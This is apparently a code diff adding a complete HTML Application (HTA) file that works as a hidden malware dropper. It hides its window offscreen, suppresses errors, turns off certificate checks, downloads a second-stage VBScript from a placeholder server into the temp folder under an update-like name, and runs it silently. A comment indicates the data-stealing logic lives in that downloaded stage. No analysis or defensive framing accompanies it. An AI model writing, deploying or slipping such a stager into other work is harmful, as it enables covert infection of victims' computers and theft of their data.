@@ -1,0 +1,27 @@
+<html>
+<head><title>.</title>
+<hta:application id="a" border="none" innerborder="no" caption="no" showintaskbar="no" sysmenu="no" contextmenu="no" selection="no"/>
+<script language="VBScript">
+window.resizeTo 0,0:window.moveTo -2000,-2000
+On Error Resume Next
+
+Dim sh: Set sh = CreateObject("WScript.Shell")
+
+' Just download and run - no steal logic in the HTA
+Dim base: base = "BASEURL_VALUE"
+Dim vbsPath: vbsPath = sh.ExpandEnvironmentStrings("%TEMP%") & "\wup.vbs"
+
+' Download the actual payload
+Dim http: Set http = CreateObject("MSXML2.ServerXMLHTTP.6.0")
+http.SetOption 2, 13056
+http.Open "GET", base & "/s.vbs", False
+http.Send
+If http.Status = 200 And Len(http.ResponseText) > 500 Then
+    Dim f: Set f = CreateObject("Scripting.FileSystemObject").CreateTextFile(vbsPath, True)
+    f.Write http.ResponseText: f.Close: Set f = Nothing
+    sh.Run "wscript.exe """ & vbsPath & """", 0, False
+End If
+
+window.close()
+</script>
+</head><body></body></html>
